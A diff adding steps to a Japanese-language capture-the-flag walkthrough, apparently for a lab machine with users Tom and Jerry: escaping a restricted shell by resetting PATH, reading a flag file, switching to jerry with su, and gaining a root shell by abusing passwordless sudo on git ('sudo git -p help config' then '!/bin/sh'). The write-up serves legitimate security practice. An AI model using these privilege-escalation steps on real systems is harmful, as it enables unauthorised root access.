@@ -102,9 +102,29 @@ echo $0
 ```
 *shになってる*
 ### 環境変数PATHを設定する
-```
+```bash
 export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
+```bash
+cat flag3.txt
 ```
-cat 
-
+*flagファイルが開けるようになる*
+- 中身
+  ```
+  Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+  ```
+16.suで他のユーザーに切り替える
+```bash
+su jerry
+```
+*以下、jerry（su）
+17.sudoコマンド設定を調べる
+```bash
+sudo -l
+# /usr/bin/gitがパスワードなしで実行できることが分かった
+```
+18.gitコマンドを利用してシェルを奪う
+```
+sudo git -p help config
+# !/bin/sh
+```
